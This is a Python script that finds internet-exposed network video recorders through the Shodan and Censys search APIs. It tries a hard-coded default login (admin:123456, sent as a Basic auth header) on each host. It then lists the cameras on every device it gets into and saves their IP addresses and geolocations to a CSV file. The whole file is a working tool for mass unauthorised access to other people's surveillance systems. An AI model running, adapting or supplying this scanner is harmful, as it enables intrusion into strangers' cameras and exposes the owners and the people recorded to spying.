from shodan import Shodan
from censys.search import CensysHosts
import config
import requests
import threading
import math

SHODAN = True
CENSYS = True
MAX_THREADS = 50

request_count = 0
success = 0
failed = 0
errors = 0
threads = 0


with open('output.csv', 'w') as f:
    f.writelines("ip,port,status_code,camera count,source,city,country,country_code,longitude,latitude\n")


thread_mutex = threading.Lock()
def change_thread_count(change):
    global threads
    thread_mutex.acquire()
    threads = threads + change
    
    if threads == 0:
       print_stats()

    thread_mutex.release()

print_mutex = threading.Lock()
def print_stats():
    global request_count
    print_mutex.acquire()

    try:
        request_count += 1
        if request_count % 100 == 0:
            print(f"scanned {request_count}, success {success}, failed {failed}, errors {errors}")
    finally:
        print_mutex.release()


success_mutex = threading.Lock()
def add_success():
    global success
    success_mutex.acquire()
    try:
        success += 1
    finally:
        success_mutex.release()


failed_mutex = threading.Lock()
def add_failed():
    global failed
    failed_mutex.acquire()
    try:
        failed += 1
    finally:
        failed_mutex.release()

error_mutex = threading.Lock()
def add_error():
    global errors
    error_mutex.acquire()
    try:
        errors += 1
    finally:
        error_mutex.release()


save_mutex = threading.Lock()
def save(server, code, count, source, city, country, country_code, long, lat):
    save_mutex.acquire()
    split = server.split(":")
    with open('output.csv', 'a') as f:
        f.writelines(f"{split[0]},{split[1]},{code},{count},{source},{city},{country},{country_code},{long},{lat}\n")

    save_mutex.release()
    exit()

def send_login_request(server, source, city, country, country_code, long, lat):
    global success, failed, request_count
    try:
        r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)

        t = "\t"
        if len(server) < 16:
            t = t + "\t"
        if r.status_code == 200:
            add_success()

            count = "N/A"
            try:
                r = requests.get(f"http://{server}/Media/Device/getDevice?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
                if r.status_code == 200:
                    json = r.json()
                    count = len(json["DeviceConfig"]["Devices"]["Device"])
            except:
                pass


            print(f"{server}{t}| {r.status_code}\t| {r.status_code == 200}\t| {count}")
            save(server, r.status_code, count, source, city, country, country_code, long, lat)
        else:
            add_failed()

    except Exception:
        add_error()

    finally:
        print_stats()
        change_thread_count(-1)



def start_thread(param, source, city, country, country_code, long, lat):
    while threads >= MAX_THREADS:
        pass


    change_thread_count(1)
    threading.Thread(target=send_login_request, args=(param,source,city,country,country_code,long,lat)).start()


print("ip\t\t\t| code\t| work \t| count")
if SHODAN:
    api = Shodan(config.SHODAN_API)
    search_term = 'http.html:NVR3.0'
   
    count = api.count(search_term)['total'] 
    for page in range(math.ceil(count/100)):
        query = api.search(query=search_term, page=page+1)
        for server in query['matches']:
            param = f"{server['ip_str']}:{server['port']}"
            location = server["location"]
            start_thread(param, "SHODAN", location["city"], location["country_name"], location["country_code"], location["longitude"], location["latitude"])

if CENSYS:
    h = CensysHosts()
    query = h.search("NVR3.0", per_page=100, pages=100)

    for page in query:
        for server in page:
            for service in server['services']:
                if service['service_name'] != "HTTP":
                    continue


                location = server["location"]

                city = location["city"] if 'city' in location else 'N/A'
                start_thread(f"{server['ip']}:{service['port']}", "CENSYS", city, location["country"], location["country_code"], location["coordinates"]["longitude"], location["coordinates"]["latitude"])
                
